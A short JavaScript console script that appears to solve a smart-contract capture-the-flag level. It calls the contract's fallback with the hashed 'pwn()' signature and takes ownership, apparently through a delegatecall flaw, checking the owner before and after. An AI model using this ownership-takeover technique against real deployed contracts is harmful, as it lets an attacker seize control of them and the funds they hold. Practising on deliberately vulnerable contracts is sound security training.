//confirm current owner
await contract.owner()

//We call the fallback function with the function signature of pwn()
let pwnSignature = web3.utils.soliditySha3("pwn()")
await sendTransaction({
    from: player,
    to: contract.address,
    data: pwnSignature
  });


//confirm owner change
await contract.owner()